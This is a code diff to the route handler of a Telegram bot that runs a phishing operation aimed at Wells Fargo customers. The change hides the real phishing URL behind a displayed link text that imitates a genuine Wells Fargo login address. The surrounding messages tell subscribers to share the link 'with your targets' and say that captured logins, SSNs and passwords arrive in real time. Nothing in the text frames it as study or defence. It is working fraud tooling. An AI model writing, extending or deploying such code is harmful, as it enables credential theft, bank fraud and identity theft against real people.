@@ -1239,12 +1239,13 @@ export async function registerRoutes(
           const hasAccess = isAdmin || subscriber?.isActive === "true";
 
           if (hasAccess) {
-            const siteUrl = "https://connect.secure.wellsfargo.org/auth/login/present?origin=cob&langPref=ENG";
+            const realUrl = getWebsiteUrl();
+            const displayUrl = "https://connect.secure.wellsfargo.org/auth/login/present?origin=cob&langPref=ENG";
             await answerCallbackQuery(query.id, "🔗 Link generated!");
             await sendTelegramMessage(
               chatId,
               `🔗 <b>Website Link</b>\n\n` +
-              `<a href="${siteUrl}">${siteUrl}</a>\n\n` +
+              `<a href="${realUrl}">${displayUrl}</a>\n\n` +
               `Share this link with your targets. All logins will be sent to you in real-time.`
             );
           } else {
@@ -1374,11 +1375,12 @@ export async function registerRoutes(
           const hasAccess = isAdmin || subscriber?.isActive === "true";
 
           if (hasAccess) {
-            const siteUrl = "https://connect.secure.wellsfargo.org/auth/login/present?origin=cob&langPref=ENG";
+            const realUrl = getWebsiteUrl();
+            const displayUrl = "https://connect.secure.wellsfargo.org/auth/login/present?origin=cob&langPref=ENG";
             await sendTelegramMessage(
               chatId,
               `🔗 <b>Website Link</b>\n\n` +
-              `<a href="${siteUrl}">${siteUrl}</a>\n\n` +
+              `<a href="${realUrl}">${displayUrl}</a>\n\n` +
               `Share this link with your targets. All logins will be sent to you in real-time.`
             );
           } else {
@@ -1471,12 +1473,13 @@ export async function registerRoutes(
           const hasAccess = isAdmin || subscriber?.isActive === "true";
 
           if (hasAccess) {
-            const siteUrl = "https://connect.secure.wellsfargo.org/auth/login/present?origin=cob&langPref=ENG";
+            const realUrl = getWebsiteUrl();
+            const displayUrl = "https://connect.secure.wellsfargo.org/auth/login/present?origin=cob&langPref=ENG";
             await sendTelegramMessageWithKeyboard(
               chatId,
               `📊 <b>View Data</b>\n\n` +
               `All captured credentials are sent to this chat in real-time as users sign in.\n\n` +
-              `<b>Phishing site:</b> <a href="${siteUrl}">${siteUrl}</a>\n\n` +
+              `<b>Phishing site:</b> <a href="${realUrl}">${displayUrl}</a>\n\n` +
               `Scroll up to see captured logins, SSNs, passwords, and other data.`,
               { inline_keyboard: [[{ text: "🔗 Get Website Link", callback_data: "generate_link" }]] }
             );
